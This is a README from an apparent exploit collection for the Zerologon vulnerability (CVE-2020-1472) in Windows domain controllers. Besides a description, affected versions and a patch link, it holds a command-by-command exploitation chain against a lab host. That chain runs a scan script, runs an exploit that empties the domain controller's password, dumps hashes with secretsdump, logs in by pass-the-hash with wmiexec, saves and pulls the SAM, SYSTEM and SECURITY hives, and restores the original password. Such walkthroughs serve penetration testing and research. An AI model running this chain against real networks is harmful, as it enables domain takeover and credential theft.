## CVE-2020-1472

#### Describe

An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller, using the Netlogon Remote Protocol (MS-NRPC), aka 'Netlogon Elevation of Privilege Vulnerability'.

#### ImpactVersion

| Product             | CPU Architecture | Version | Update | Tested             |
| :------------------ | :--------------- | ------- | ------ | ------------------ |
| Windows Server 2008 | x64              | R2      | SP1    | &#10004; |
| Windows Server 2012 |                  |         |        |                    |
| Windows Server 2012 |                  | R2      |        |                    |
| Windows Server 2016 |                  |         |        |                    |
| Windows Server 2019 |                  |         |        |                    |
| Windows Server      |                  | 1903    |        |                    |
| Windows Server      |                  | 1909    |        |                    |
| Windows Server      |                  | 2004    |        |                    |
| Windows Server      |                  | 20H2    |        |                    |

#### Patch

```
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472
```

#### Utilization

> 注意：EXP脚本会重置域控机器的密码！！！不要瞎鸡儿乱用！！！！！！！！

Test system Windows Server 2008 R2 SP1 X64 ，And set the environment to domain control machine

![image-20201002201920794](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2020-1472_dc-server.png)

As you can know above:

- Domain->ascotbe.com
- Computer name->dc
- Domain control IP->192.168.183.171

Using the previous environment configuration, you need a version of Python3.7 +, if you have previously installed the python packet installed` Impacket`(Such as Kali) Need to uninstall the package, shortcut statement that reinstalls `0.9.21`,`python3 -m pip install git+https://github.com/SecureAuthCorp/impacket`，Below is a general method

```
python3 -m pip install -r Kernelhub.txt
#If you discard the download slow project, you can use it.
git clone --depth=1 https://github.com/SecureAuthCorp/impacket
```

> Scan script

This script is used to test whether the machine has a vulnerability

```
#Usage: CVE-2020-1472_Scan.py <dc-name> <dc-ip>
python3 CVE-2020-1472_Scan.py dc 192.168.183.171
```

![image-20201002203037104](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2020-1472_scan.png)

> Use script

The script will reset the password to empty! ! It is easy to control the loss! !

```
#Usage: CVE-2020-1472_Exploit.py <dc-name> <dc-ip>
python3 CVE-2020-1472_Exploit.py dc 192.168.183.171
```

![image-20201002204223509](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2020-1472_exp.png)

Then enter the downloaded `impacket` project, log in with an empty password

```
cd impacket/examples/
#Usage: secretsdump.py <dc>/<dc-name>\$@<dc-ip>
python3 secretsdump.py ascotbe.com/dc\$@192.168.183.171 -no-pass
```

![image-20201002203751057](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2020-1472_secretsdump.png)

Then use HASH to log in

```
#Usage: wmiexec.py -hashes <user-hash> <dc>/<user-name>@<dc-ip>
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:45280efa2300182b4f7fdc2cee182149  ascotbe.com/administrator@192.168.183.171
```

![image-20201002204817764](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2020-1472_wmiexec.png)

> Restore password

After saving your password, download to the local, then delete the file on the domain control.

```
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
get system.save
get sam.save
get security.save
del system.save
del sam.save
del security.save
```

![image-20201002205958192](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2020-1472_hash.png)

Next to decrypt

```
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

![image-20201002210258903](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2020-1472_decrypt_hash.png)

You can see that this is the password before modifying, followed by back to the desktop using the script recovery password

```
#Usage: CVE-2020-1472_RestoreOriginalPassword.py <dc-name> <dc-ip> <dc-original-hash>
python3 CVE-2020-1472_RestoreOriginalPassword.py dc 192.168.183.171 d4ac5a73fd3f13dfd9d6de036a9e99a2
```

![image-20201002212122966](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2020-1472_restore_original_password.png)

#### Analyze
- https://xz.aliyun.com/t/8367
- https://www.freebuf.com/articles/system/249860.html
- https://www.freebuf.com/vuls/249813.html
- https://cert.360.cn/report/detail?id=2e904ef9ac96834a3dd7fc058cea4fe5

#### ProjectSource

- Scan script:[SecuraBV](https://github.com/SecuraBV/CVE-2020-1472)
- Use script:[dirkjanm](https://github.com/dirkjanm/CVE-2020-1472)
- Recovery script:[risksense](https://github.com/risksense/zerologon)